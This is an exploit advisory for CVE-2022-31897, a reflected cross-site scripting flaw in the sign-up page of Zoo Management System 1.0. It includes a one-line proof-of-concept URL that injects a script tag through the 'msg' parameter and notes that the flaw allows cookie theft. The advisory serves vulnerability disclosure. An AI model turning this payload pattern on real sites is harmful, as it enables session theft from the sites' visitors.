# CVE-2022-31897

# Date: 06/22/2022
# Exploit Author: Angelo Pio Amirante
# Vendor Homepage: https://www.sourcecodester.com/
# Software Link: https://www.sourcecodester.com/php/15344/zoo-management-system-phpoop-free-source-code.html
# Version: 1.0
# Tested on: Server: XAMPP on Windows 10 
# CVE: CVE-2022-31897

# Description:
Zoo Management System 1.0 is vulnerable to reflected cross-site scripting on the sign-up page. The "msg" parameter in 'http://localhost/public_html/register_visitor?msg=' is vulnerable.

# Impact:
An attacker could steal cookies with a crafted URL sent to the victims.

# Exploit:

Visit the following page: 

1. http://localhost/public_html/register_visitor?msg=<script>alert(window.navigator.userAgent)</script>

2. Alert pop up is fired!


# Image poc:

- [Registration page](https://ibb.co/8XKDgJX)
- [XSS](https://ibb.co/mTTmTmy)

 
